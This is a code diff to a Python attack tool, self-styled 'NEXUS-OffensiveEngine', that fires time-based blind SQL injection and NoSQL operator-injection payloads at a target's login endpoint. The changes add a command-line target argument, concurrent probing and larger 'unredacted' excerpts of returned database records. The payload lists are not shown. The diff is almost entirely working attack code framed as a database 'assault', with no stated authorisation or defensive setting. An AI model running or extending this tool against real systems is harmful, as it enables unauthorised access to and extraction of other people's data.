@@ -5,7 +5,7 @@ Features:
 - Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors)
 - Boolean and error-based inference checks
 - Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
-- Zero-disk live terminal streaming
+- Zero-disk live terminal streaming with unredacted red-team evidence output
 """
 import asyncio
 import http.client
@@ -55,7 +55,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "BruteDog-AggressiveDB/5.3",
+            "User-Agent": "NEXUS-OffensiveEngine/3.1",
             "Content-Type": ct,
             "Accept": "*/*",
             "Connection": "close"
@@ -88,19 +88,38 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         
         # 1. Time-Based Blind SQLi Assault
         for payload in SQL_TIME_PAYLOADS:
-            res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
+            log(f"  [-] Probing SQLi [Payload: {payload}]", "\033[90m")
+            res = await asyncio.to_thread(send_http, host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
             if res["elapsed"] >= 4.5:
                 log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
-                findings.append({"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]})
+                log(f"    └── Unredacted Evidence -> Payload: {payload} | Elapsed: {res['elapsed']}s", "\033[93m")
+                findings.append({
+                    "vector": "Time-Based Blind SQLi",
+                    "endpoint": endpoint,
+                    "payload": payload,
+                    "delay": res["elapsed"],
+                    "status": res["status"]
+                })
 
         # 2. NoSQL Operator & Extraction Assault
         for payload in NOSQL_EXTRACTION_PAYLOADS:
-            res = send_http(host, target_port, endpoint, payload, secure)
+            log(f"  [-] Probing NoSQL [Payload: {json.dumps(payload)}]", "\033[90m")
+            res = await asyncio.to_thread(send_http, host, target_port, endpoint, payload, secure)
             if res["status"] in (200, 201) and len(res["body"]) > 50:
-                log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}]", "\033[92m")
-                log(f"  └── Response Excerpt: {res['body'][:150]}", "\033[96m")
-                findings.append({"vector": "NoSQL Operator Injection", "endpoint": endpoint, "payload": payload, "response_sample": res["body"][:100]})
+                log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}] (Status: {res['status']})", "\033[92m")
+                log(f"  └── Unredacted Response Excerpt: {res['body'][:300]}", "\033[96m")
+                findings.append({
+                    "vector": "NoSQL Operator Injection",
+                    "endpoint": endpoint,
+                    "payload": payload,
+                    "status": res["status"],
+                    "response_sample": res["body"][:500]
+                })
 
     log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
     return findings
 
+if __name__ == "__main__":
+    import sys
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
+    asyncio.run(run_nosql_assault(target))
